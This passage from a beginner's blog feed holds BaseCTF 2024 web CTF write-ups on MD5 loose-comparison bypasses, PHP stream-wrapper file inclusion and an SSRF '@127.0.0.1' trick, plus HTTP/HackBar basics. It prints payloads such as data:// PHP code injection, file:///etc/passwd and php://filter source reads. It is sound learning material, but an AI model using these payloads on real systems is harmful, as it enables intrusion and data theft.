是相等的。</p><p>PHP转换规则：</p><p>若一个数字和一个字符串进行比较或者进行运算时,PHP会把字符串转换成数字再进行比较。若字符串以数字开头,则取开头数字作为转换结果,不能转换为数字的字符串（例如”aaa”是不能转换为数字的字符串,而”123”或”123aa”就是可以转换为数字的字符串）或null,则转换为0；</p><p>数字和“e”开头加上数字的字符串（例如”1e123”）会当作科学计数法去比较；0e在比较的时候会将其视作为科学计数法,所以无论0e后面是什么,0的多少次方还是0；</p><p>当字符串被当作一个数值来处理时,如果该字符串没有包含’<font style="color:#DF2A3F;">.</font>’,‘<font style="color:#DF2A3F;">e</font>’和<font style="color:#DF2A3F;">‘E</font>’并且其数值在整形的范围之内,该字符串作为int来取值,其他所有情况下都被作为float来取值,并且字符串开始部分决定它的取值,开始部分为数字,则其值就是开始的数字,否则,其值为0。</p><p>原文链接：<a href="https://blog.csdn.net/qq_45671431/article/details/105456684">https://blog.csdn.net/qq_45671431&#x2F;article&#x2F;details&#x2F;105456684</a></p><p>关于MD5：</p><p><font style="color:rgb(51, 51, 51);">MD5信息</font><a href="https://baike.baidu.com/item/%E6%91%98%E8%A6%81%E7%AE%97%E6%B3%95/12011257?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">摘要算法</font></a><font style="color:rgb(51, 51, 51);">（英语：MD5 Message-Digest Algorithm）,一种被广泛使用的</font><a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0/14937715?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">密码散列函数</font></a><font style="color:rgb(51, 51, 51);">,可以产生出一个128位（16字节）的</font><a href="https://baike.baidu.com/item/%E6%95%A3%E5%88%97%E5%80%BC/10398613?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">散列值</font></a><font style="color:rgb(51, 51, 51);">（hash value）,用于确保</font><a href="https://baike.baidu.com/item/%E4%BF%A1%E6%81%AF%E4%BC%A0%E8%BE%93/9897864?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">信息传输</font></a><font style="color:rgb(51, 51, 51);">完整一致。MD5由美国密码学家</font><a href="https://baike.baidu.com/item/%E7%BD%97%E7%BA%B3%E5%BE%B7%C2%B7%E6%9D%8E%E7%BB%B4%E6%96%AF%E7%89%B9/700199?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">罗纳德·李维斯特</font></a><font style="color:rgb(51, 51, 51);">（Ronald Linn Rivest）设计,于1992年公开,用以取代</font><a href="https://baike.baidu.com/item/MD4/8090275?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">MD4</font></a><font style="color:rgb(51, 51, 51);">算法。这套算法的程序在 RFC 1321 标准中被加以规范。1996年后该算法被证实存在弱点,可以被加以破解,对于需要高度安全性的数据,专家一般建议改用其他算法,如</font><a href="https://baike.baidu.com/item/SHA-2/22718180?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">SHA-2</font></a><font style="color:rgb(51, 51, 51);">。2004年,证实MD5算法无法防止碰撞（</font><a href="https://baike.baidu.com/item/collision/19660439?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">collision</font></a><font style="color:rgb(51, 51, 51);">）,因此不适用于安全性认证,如</font><a href="https://baike.baidu.com/item/SSL/320778?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">SSL</font></a><font style="color:rgb(51, 51, 51);">公开</font><a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5%E8%AE%A4%E8%AF%81/9882212?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">密钥认证</font></a><font style="color:rgb(51, 51, 51);">或是</font><a href="https://baike.baidu.com/item/%E6%95%B0%E5%AD%97%E7%AD%BE%E5%90%8D/212550?fromModule=lemma_inlink"><font style="color:rgb(51, 51, 51);">数字签名</font></a><font style="color:rgb(51, 51, 51);">等用途。</font></p><p><font style="color:rgb(51, 51, 51);"></font></p><p>关于echo:</p><p><font style="color:rgb(77, 77, 77);">echo是一个至关重要的语言结构,它负责在浏览器中输出一个或多个字符串。</font></p><p>代码复制到Visual Studio Code</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732346585045-2382e03c-04fd-4a87-bdad-54c367bf881a.png"></p><p>先分析代码：它是先引用了’flag.php’,之后是要传入GET参数的name、name2和post参数里面的passward、password2。在下面的判断中如果name不弱等于passward并且他们的md5值弱等于,就进入下一个判断,否则输出”错啦错啦”。在第二次的判断中如果name2不强等于passward2并且name2和passward2的md5值强等于,就输出flag,否则输出”再看看啊,马上绕过嘞！”</p><p>思路：这道题用md5绕过,弱比较可以使用数组或是以下md5后开头为0e的字符串任意两个来绕过：</p><ol><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>0e215962017</li></ol><p>因为在php中0e字符串都会被弱转换成0,所以这些字符原本是不一样的,但是经过md5转换后弱转换成一样的了,这样就算是绕过了。</p><p>强弱比较都可以直接用数组绕过,原理是：md5只针对的是字符串来进行处理,如果传入的其他的类型比如是数组,这时候就会返回一个null,同时会报错表示其不能对数组进行处理。所以他们数组的内容本来是不一致的,但是它们md5传回来都是null,是一样的,所以就算是绕过了。</p><p>所以在页面中打开KackBar传入name、name2、password和password2的对应的值就行了,值的内容如下：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732349756713-7a94b59e-a331-4483-8845-338b67752a94.png"></p><p>此时flag就出现了,提交即可。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732349756849-229c1c14-cb79-449d-82cc-d1aadb87370a.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732349756762-cfacd25f-78a5-4d6e-a661-d7985572da89.png"></p><h1 id="三、Aura-酱的礼物"><a href="#三、Aura-酱的礼物" class="headerlink" title="三、Aura 酱的礼物"></a>三、Aura 酱的礼物</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732350166790-a0a66c81-3131-4178-958c-20d02d25021b.png"></p><p>该题目说有推荐搜索关键词: 伪协议,SSRF,查了一下</p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">关于伪协议：</font></p><p><font style="color:rgb(77, 77, 77);">伪协议包含：file:&#x2F;&#x2F; 、 data:&#x2F;&#x2F; 、 phar:&#x2F;&#x2F; 、 php:&#x2F;&#x2F; 、 gopher:&#x2F;&#x2F; 、dict:&#x2F;&#x2F;等。PHP 带有很多内置 URL 风格的封装协议,可用于类似 </font><a href="https://so.csdn.net/so/search?q=fopen&spm=1001.2101.3001.7020">fopen</a><font style="color:rgb(77, 77, 77);">()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议,还能通过stream_wrapper_register() 来注册自定义的封装协议。伪协议常常用于文件包含漏洞之中。在php中能够造成文件包含的函数有include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile。</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">php支持的伪协议：</font></p><p><font style="color:rgb(77, 77, 77);">1 file:&#x2F;&#x2F; — 访问本地文件系统</font></p><p><font style="color:rgb(77, 77, 77);">2 http:&#x2F;&#x2F; — 访问 HTTP(s) 网址</font></p><p><font style="color:rgb(77, 77, 77);">3 ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</font></p><p><font style="color:rgb(77, 77, 77);">4 php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）</font></p><p><font style="color:rgb(77, 77, 77);">5 zlib:&#x2F;&#x2F; — 压缩流</font></p><p><font style="color:rgb(77, 77, 77);">6 data:&#x2F;&#x2F; — 数据（RFC 2397）</font></p><p><font style="color:rgb(77, 77, 77);">7 glob:&#x2F;&#x2F; — 查找匹配的文件路径模式</font></p><p><font style="color:rgb(77, 77, 77);">8 phar:&#x2F;&#x2F; — PHP 归档</font></p><p><font style="color:rgb(77, 77, 77);">9 ssh2:&#x2F;&#x2F; — Secure Shell 2</font></p><p><font style="color:rgb(77, 77, 77);">10 rar:&#x2F;&#x2F; — RAR</font></p><p><font style="color:rgb(77, 77, 77);">11 ogg:&#x2F;&#x2F; — 音频流</font></p><p><font style="color:rgb(77, 77, 77);">12 expect:&#x2F;&#x2F; — 处理交互式的流</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">fill:&#x2F;&#x2F;：</font></p><p><font style="color:rgb(77, 77, 77);">用于访问本地文件系统,并且不受allow_url_fopen,allow_url_include影响</font><font style="color:rgba(0, 0, 0, 0.75);">,</font><font style="color:rgb(77, 77, 77);">file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径),比如：<a href="http://www.xx.comfile=file///etc/passsword">http://www.xx.comfile=file:///etc/passsword</a></font></p><p><font style="color:rgba(0, 0, 0, 0.75);"></font></p><p><font style="color:rgba(0, 0, 0, 0.75);">data:&#x2F;&#x2F;：</font></p><p><font style="color:rgba(0, 0, 0, 0.75);">是数据流封装器,和php:&#x2F;&#x2F;相似,都是利用了流的概念,将原本的include的文件流重定向到了用户可控制</font>的输入流中,简单来说就是执行文件的包含方法包含了你的输入流,通过包含你输入的payload来实现目的。它可以让用户来控制输入流,当它与包含函数结合时,用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>示例用法：</p><p>1、data:&#x2F;&#x2F;text&#x2F;plain,</p><p><a href="http://127.0.0.1/include.php?file=data://text/plain">http://127.0.0.1/include.php?file=data://text/plain</a>,<?php%20phpinfo();?> </p><p>2、data:&#x2F;&#x2F;text&#x2F;plain;base64,</p><p><a href="http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</a></p><p>php:&#x2F;&#x2F;filter：</p><p>php:&#x2F;&#x2F;filter 是一种元封装器, 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用,类似 readfile()、 file() 和 file_get_contents(), 在数据流内容读取之前没有机会应用其他过滤器。简单通俗的说,这是一个中间件,在读入或写入数据的时候对数据进行处理后输出的一个过程。resource&#x3D;&lt;要过滤的数据流&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。</p><p>关于SSRF：</p><p><font style="color:rgb(77, 77, 77);">一、SSRF是什么？</font></p><p><font style="color:rgb(77, 77, 77);">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下,SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的,所以它能够请求到与它相连而与外网隔离的内部系统）</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">二、SSRF漏洞原理</font></p><p><font style="color:rgb(77, 77, 77);">SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732350521482-c3fdd896-7ad7-42e1-92e7-8f3cfe94e318.png"></p><p><font style="color:rgb(77, 77, 77);">比如,黑客操作服务端从指定URL地址获取网页文本内容,加载指定地址的图片,下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</font></p><p><font style="color:rgb(77, 77, 77);">SSRF攻击可能存在任何语言编写的应用,接下来将举例</font><font style="color:rgb(0, 0, 0);">php</font><font style="color:rgb(77, 77, 77);">中可能存在SSRF漏洞的函数。</font></p><p><font style="color:rgb(77, 77, 77);">1.file_get_contents</font></p><p><font style="color:rgb(77, 77, 77);">2.sockopen()</font></p><p><font style="color:rgb(77, 77, 77);">3.curl_exec()</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">参考文章：</font><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996&#x2F;article&#x2F;details&#x2F;124050308</a></p><p>关于本题要用到的URL格式：</p><p>URL 的格式为 scheme:&#x2F;&#x2F;user:password@address:port&#x2F;path?query#fragment</p><p>scheme：表示当前是什么协议</p><p>user:password：表示我要拿什么用户密码来验证</p><p>@后面address：表示跟上路径地址</p><p>port：表示端口号,也就是靶机</p><p>path：路径</p><p>?后面的query：表示get参数</p><p>#后面的fragment：#后面的内容是不会穿给服务端的,是传给前端进行解析</p><p>关于<font style="color:rgb(0, 0, 0);">strpos() 函数：</font></p><p><font style="color:rgb(0, 0, 0);">strpos() 函数查找字符串在另一字符串中第一次出现的位置。</font><font style="color:rgb(0, 0, 0);">返回字符串在另一字符串中第一次出现的位置,如果没有找到字符串则返回 FALSE。</font></p><p><font style="color:rgb(0, 0, 0);"></font></p><p>关于include()<font style="color:rgb(0, 0, 0);">函数：</font></p><p>PHP的include函数用于在一个文件中包含另一个文件的内容<font style="color:rgb(17, 17, 17);">。</font>它可以用于创建可在多个页面重复使用的函数、页眉、页脚或元素。include语句会获取指定文件中存在的所有文本、代码或标记,并复制到使用include语句的文件中。与之类似的是require函数,它也用于包含其他文件的内容,但require只处理一次,而include每次都要进行读取和评估</p><p><font style="color:rgb(0, 0, 0);"></font></p><p>关于127.0.0.1 IP地址</p><p>首先我们要先知道一个概念,凡是以<code>127</code>开头的IP地址,都是回环地址（Loop back address）,其所在的回环接口一般被理解为虚拟网卡,并不是真正的路由器接口。</p><p>所谓的回环地址,通俗的讲,就是我们在主机上发送给127开头的IP地址的数据包会被发送的主机自己接收,根本传不出去,外部设备也无法通过回环地址访问到本机。</p><p>而127.0.0.1作为{127}集合中的一员,当然也是个回环地址。只不过127.0.0.1经常被默认配置为localhost的IP地址。<br>一般会通过ping 127.0.0.1来测试某台机器上的网络设备是否工作正常。</p><p>进入到题目中发现</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732351707464-0e3e9245-c1e3-4660-923a-f4186abe9fbe.png">、</p><p><font style="color:#000000;">分析代码：</font></p><p><font style="color:#000000;">只有中间的 </font><font style="color:#000000;">file_get_contents</font><font style="color:#000000;">(</font><font style="color:#000000;">$pen</font><font style="color:#000000;">) &#x3D;&#x3D; </font><font style="color:#000000;">‘Aura’ </font><font style="color:#000000;">才可绕过第一个</font></p><p><font style="color:#000000;">只有 </font><font style="color:#000000;">strpos</font><font style="color:#000000;">(</font><font style="color:#000000;">$challenge</font><font style="color:#000000;">, </font><font style="color:#000000;">‘<a href="http://jasmineaura.github.io/">http://jasmineaura.github.io</a>‘</font><font style="color:#000000;">) &#x3D;&#x3D; </font><font style="color:#000000;">0 </font><font style="color:#000000;">也就是challenge&#x3D;<a href="http://jasmineaura.github.io才可绕过第二个/">http://jasmineaura.github.io才可绕过第二个</a></font></p><p><font style="color:#000000;">只有</font><font style="color:#000000;"> strpos</font><font style="color:#000000;">(</font><font style="color:#000000;">$blog_content</font><font style="color:#000000;">, </font><font style="color:#000000;">‘已经收到Kengwang的礼物啦’</font><font style="color:#000000;">) !&#x3D;&#x3D; </font><font style="color:#000000;">false</font><font style="color:#000000;"> ,也就是读出”</font><font style="color:#000000;">已经收到Kengwang的礼物啦</font><font style="color:#000000;">“才可绕过第三个</font></p><p><font style="color:#000000;"></font></p><p><font style="color:#000000;">首先对于第一个判断, 他需要读取一个</font>文件后内容是Aura,我们可以尝试通过data:&#x2F;&#x2F;伪协议来进行读取在文件读取的情况下, 利用 data:&#x2F;&#x2F; 伪协议:</p><p>data:&#x2F;&#x2F;text&#x2F;plain,一串内容                       可以读取出 一串内容</p><p>data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxxxxxx           其中 xxxxxxx 会被 Base64 解码后再读取出内容  </p><p>所以我们此处可以使用:“pen&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,Aura“来进行绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732352894474-9e2dae12-551f-4686-b745-a1a2cb311dff.png"></p><p>上传一下发现已经绕过成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732352975779-1a51c0bc-35ac-469b-b379-c67dcb7ea4ad.png"></p><p>想要绕过下一个可以利用这个get参数让challenge&#x3D;<a href="http://jasmineaura.github.io/">http://jasmineaura.github.io</a></p><p>即在后面&amp;加上challenge&#x3D;<a href="http://jasmineaura.github.io就行了/">http://jasmineaura.github.io就行了</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732355046618-330e9d84-c908-4c74-9903-bcc6184d5989.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732355046614-e16962a5-9005-4677-a0dc-83e3c6a1c5a9.png"></p><p>此时可以在前面加上@,前面的jasmineaura.github.io表示为用户和密码,密码可以为空。@后面跟上真实的路径,真实的路径可以为自己的服务器,在自己的服务器写下这个页面,也可以利用之前的题目的靶机来写,也可以用当前的页面,因为当前页面有这个内容的。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732356226422-343b9796-ef31-4af0-9427-51f0bb0d20f1.png"></p><p>所以直接可以@127.0.0.1获取当前页面这样的花就可以进行绕过</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732356612379-40b36c3b-8644-4561-8b0a-67570043caa1.png"></p><p>可以发现”请去博客里面写下感想哦~”已经没有了说明已经绕过成功了</p><p>最后就是gift,include函数会解析文件里的php标签,而flag写在了注释的位置,所以这里需要将其伪协议和过滤器来进行 base64 编码后输出</p><p><font style="color:#000000;">php:&#x2F;&#x2F;格式为：php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</font></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732357452464-3cf9b5db-20e9-4d1c-b7b4-704852365011.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732357452537-90191b83-82bc-454c-b142-2f918f34d28a.png"></p><p>最后用base64解码,就解出来了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732357784745-51abd99d-fe2d-4c7e-b797-6f80241d3956.png"><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1732357784743-ac94cca3-544a-41c3-80cc-ff70e71a48eb.png"></p><p>这样BaseCTF2024新生赛复现week1就算是做完了,休息一下咯</p>]]></content>
      
      
      <categories>
          
          <category> HelloWeb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Training </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello-Web</title>
      <link href="/2024/11/12/HelloWeb/Hello-Web/"/>
      <url>/2024/11/12/HelloWeb/Hello-Web/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/>本人大一新生，专业是信息安全，第一次注册账号打开BaseCTF2024新生赛，看了一下里面的题目，对于一个连C语言学的都有些吃力的大一学生来说确实有些晦涩难懂。但是这些知识早晚都得学，所以我也想借这个机会好好去学习一下，了解一下互联网。<p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664348074-3f45e05e-b3e5-497a-9969-70595fd4ff1a.png"></p><ul><li><input disabled="" type="checkbox"> </li></ul><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664366340-b477d68d-77bc-4709-9a93-a8916364ccbe.png"></p><p>这些题目的答案的提交都需要flag，我查了一下flag的含义：</p><p>“flag用于标记某种状态、属性或情况等。比如设置一个“flag”来表明某个用户是否已经登录（登录状态设为一种“flag”值，未登录设为另一种），或者标记某个任务是否完成（完成设为一个特定“flag”值，未完成是另一个）等，方便程序在运行过程中根据这些“flag”的值来进行不同的处理操作。”</p><p>能力有限，所以复现题目为web中week1的内容：<strong>A dark room、HTTP是什么呀和喵喵喵´•ﻌ•&#96;</strong></p><p>复现这些题目时我是跟着这个视频一步一步来的:</p><p><a href="https://www.bilibili.com/video/BV19wWEeoE1o/spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=88ab8d2adf5ab07f0674cb316b7c960a#"><u><font style="color:rgb(0,0,255);">https://www.bilibili.com/video/BV19wWEeoE1o/spm_id_from&#x3D;333.1007.top_right_bar_window_history.content.click&amp;vd_source&#x3D;88ab8d2adf5ab07f0674cb316b7c960a#</font></u></a><u><font style="color:rgb(0,0,255);"> </font></u></p><h1 id="一、A-dark-room"><a href="#一、A-dark-room" class="headerlink" title="一、A dark room"></a>一、A dark room</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664456471-de3a21a2-99be-454d-9d25-3c64233191db.png"></p><p>这种小游戏的flag一般是藏在这个源代码里面的，可以用F12看源代码看元素找flag，其他的可以看网络请求，通常在这种游戏过关的题里面，通常查看看js代码，里面可能藏flag。其他的题可能藏在javascript里面。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664463478-95ced820-0453-40e9-aaaa-a12e9278f0f4.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664467380-c1664807-98ce-46af-bbd1-6f3516d30bf0.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664515149-d4b26abd-f9a5-4398-9a20-bf3ca42568aa.png"></p><h1 id="二、HTTP是什么呀"><a href="#二、HTTP是什么呀" class="headerlink" title="二、HTTP是什么呀"></a>二、HTTP是什么呀</h1><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664522869-f6bf8c52-8271-4f99-98ff-8749f31fa359.png"></p><p>关于<strong>HTTP</strong>：超文本传输协议（HTTP）是一个用于传输超媒体文档（例如 HTML）的应用层协议。它是为Web 浏览器与 Web 服务器之间的通信而设计的，但也可以用于其他目的。HTTP 遵循经典的客户端—服务端模型，客户端打开一个连接以发出请求，然后等待直到收到服务器端响应。HTTP 是无状态协议，这意味着服务器不会在两个请求之间保留任何数据（状态）。</p><p>参考这篇文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></p><h2 id="1-GET参数"><a href="#1-GET参数" class="headerlink" title="1.GET参数"></a>1.GET参数</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664538073-4396a9c3-c4a5-472a-b46e-439e95ee739f.png"></p><p>查看新手指引和视频内容，解这道题需要下载<strong>Hackbar</strong></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664576470-eb867020-0478-4764-96d8-9b8ff8bff8dc.png"></p><p>打开下载链接发现响应时间太长了，看攻略需要科学上网一下，之前我是没用过ladder的，花了一上午从B站、QQ、Github等平台上找资料学习，最后下载好了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664571506-4bf097b4-20b7-46cc-ab41-5c792b175a43.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664710965-487f7056-a560-4825-bf43-a0f47183a807.png"></p><p>关于<strong>HackBar</strong>：</p><p>HackBar是一个用于浏览器的扩展插件，主要用于进行网络渗透测试和安全评估。它提供了一系列方便的工具和功能，可以帮助用户执行各种网络攻击和测试，包括 XSS、SQL 注入、CSRF、路径穿越等。以下是 HackBar插件的一些主要特点和功能：</p><p>自定义请求发送：HackBar允许用户自定义 HTTP 请求，并可以通过插件直接发送这些请求。用户可以手动构造 GET、POST、PUT、DELETE 等类型的请求，并添加自定义的 HTTP 头部、参数等信息。</p><p>编码&#x2F;解码工具：HackBar提供了各种编码和解码工具，包括 URL 编码、Base64 编码、MD5 加密等。这些工具可用于在渗透测试中对数据进行编码或解码，以绕过一些安全机制或进行数据处理。</p><p>漏洞检测：HackBar可以帮助用户检测网站中常见的漏洞，例如 XSS、SQL 注入、CSRF 等。用户可以通过插件发送特定的测试请求，然后分析响应来确定目标网站是否存在漏洞。</p><p>Cookie 管理：HackBar允许用户管理浏览器中的 Cookie，包括添加、编辑、删除 Cookie 等操作。这对于进行身份验证、绕过登录限制等方面的渗透测试非常有用。</p><p>参数注入：HackBar提供了一个参数注入工具，可以帮助用户在 URL 中注入自定义的参数。用户可以使用这个工具测试网站的安全性，尝试发现潜在的漏洞。</p><p>总的来说，HackBar是一款功能丰富、易于使用的浏览器插件，适用于进行各种网络渗透测试和安全评估任务。它提供了许多有用的工具和功能，可以帮助安全专家快速有效地发现和利用网站中的漏洞。</p><p>参考资料：<a href="https://blog.csdn.net/2302_82189125/article/details/137762983"><u><font style="color:rgb(0,0,255);">https://blog.csdn.net/2302_82189125&#x2F;article&#x2F;details&#x2F;137762983</font></u></a></p><p>关于<strong>URL</strong>:</p><p>Internet上的每一个网页都具有一个唯一的名称标识，通常称之为URL（Uniform Resource Locator, 统一资源定位器）。它是www的统一资源定位标志，简单地说URL就是web地址，俗称“网址”。URL是对互联网上得到的资源的位置和访问方法的一种简洁表示，是互联网上标准资源的地址。URL它具有全球唯一性，正确的URL应该是可以通过浏览器打开此网页的，但如果您访问外网，会提示网页无法打开，这并不能说明这个URL是错误的。只不过在国内不能访问而已。</p><p>参考资料：<a href="https://blog.csdn.net/chen1415886044/article/details/103914255"><u><font style="color:rgb(0,0,255);">https://blog.csdn.net/chen1415886044/article/details/103914255</font></u></a></p><p>百分号编码的内容查了一下：<font style="color:rgb(77,77,77);">URL编码（也称为百分号编码）是一种在URL中表示特殊字符的方法。它将非字母数字字符替换为</font>%<font style="color:rgb(77,77,77);">后跟两个表示字符</font><font style="color:rgb(77,77,77);">ASCII值的</font>十六进制<font style="color:rgb(77,77,77);">数字。这种编码用于确保这些字符可以安全地包含在</font><font style="color:rgb(77,77,77);">URL中，在传输和解析过程中不会引起错误</font><font style="color:rgb(77,77,77);">。</font></p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><p><font style="color:rgb(79,79,79);">特殊字符及其编码意义：</font></p><p>空格（Space）：%20  引号（”）：%22  百分号（%）：%25  加号（+）：%2B  斜杠（&#x2F;）：%2F</p><p>冒号（:）：%3A  问号（?）：%3F@   符号（@）：%40  链接符号（#）：%23</p><p>解这道题首先要GET参数basectf，GET参数我们需要问号来传递。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664780527-79e08454-952d-4ac8-becf-ca9e32c23cc6.png"></p><p>我当时直接传递成这样了,发现问题是我这个问号是中文的，并且%的内容没有转译过去。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664793104-ed6333d9-6441-472e-ae98-42208482cd74.png"></p><p>在HackBar中用ENCODING中修正后就成功了</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664847079-c10feb7a-18f7-4452-8b3e-9b59b21884eb.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664805727-627f227f-fee6-4aba-88c4-020da1bfa4e8.png"></p><h2 id="2-POST参数"><a href="#2-POST参数" class="headerlink" title="2.POST参数"></a>2.POST参数</h2><p><font style="color:rgb(24,24,24);">HTTP四种请求：POST、GET、DELETE、PUT。</font></p><p><font style="color:rgb(36,41,46);">POST</font><font style="color:rgb(36,41,46);">请求用于向指定资源提交数据，通常会导致服务器端的状态发生变化。例如，在</font><font style="color:rgb(36,41,46);">Web 表单中填写用户信息并提交时，就是使用</font><font style="color:rgb(36,41,46);">POST</font><font style="color:rgb(36,41,46);">请求方式将表单数据提交到服务器存储。使用</font><font style="color:rgb(36,41,46);">POST</font><font style="color:rgb(36,41,46);">请求方式提交的数据会被包含在请求体中，而不像</font><font style="color:rgb(36,41,46);">GET</font><font style="color:rgb(36,41,46);">请求方式那样包含在</font><font style="color:rgb(36,41,46);">URL 中。因此，</font><font style="color:rgb(36,41,46);">POST</font><font style="color:rgb(36,41,46);">请求可以提交比</font><font style="color:rgb(36,41,46);">GET</font><font style="color:rgb(36,41,46);">更大的数据量，并且相对更安全。</font></p><p><font style="color:rgb(36,41,46);">GET</font><font style="color:rgb(36,41,46);">请求用于向指定资源发出请求，请求中包含了资源的</font><font style="color:rgb(36,41,46);">URL 和请求参数。服务器端通过解析请求参数来返回相应的资源，不会修改服务器端的状态。使用</font><font style="color:rgb(36,41,46);">GET</font><font style="color:rgb(36,41,46);">请求方式提交的数据会被包含在</font><font style="color:rgb(36,41,46);">URL中，因此易于被缓存和浏览器保存，但也因此不适合用于提交敏感数据。</font></p><p><font style="color:rgb(36,41,46);">DELETE</font><font style="color:rgb(36,41,46);">请求用于请求服务器删除指定的资源，可以理解为对服务器上的资源进行删除操作。使用</font><font style="color:rgb(36,41,46);"> </font><font style="color:rgb(36,41,46);">DELETE</font><font style="color:rgb(36,41,46);"> 方式请求会导致指定的资源被永久删除，因此需要谨慎使用。</font></p><p><font style="color:rgb(36,41,46);">PUT</font><font style="color:rgb(36,41,46);">请求用于向服务器更新指定资源，可以理解为对服务器上的资源进行修改操作。使用</font><font style="color:rgb(36,41,46);">PUT</font><font style="color:rgb(36,41,46);">请求方式会覆盖原有的资源内容，因此需要谨慎使用。</font></p><p>参考资料：<a href="https://developer.aliyun.com/article/1476820"><font style="color:rgb(0,0,255);">https://developer.aliyun.com/article/1476820</font></a></p><p>这道题打开下方的use POST method 输入Base&#x3D;fl@g再传递就行了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664839492-9c44b17b-6eca-4337-be4b-54896494a493.png"></p><h2 id="3-Cookie"><a href="#3-Cookie" class="headerlink" title="3.Cookie"></a>3.Cookie</h2><p>Cookie主要是存储用户登录网站时的数据，这样的话每一次访问网站的时候都会把Cookie带上，这样的话就是一个有状态的HTTP。</p><p>Get 和post都是拿&amp;符号分隔的，cookie是分号来分隔的。</p><p>这道题在右下角Name一栏中输入Cookie，Value一栏中输入c00k13&#x3D;i can’t eat it就行了。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/50616406/1731664891335-53844eab-1d23-458e-985b-38b7ca2320c3.png"></p><h2 id="4-用户代理-User-Agent"><a 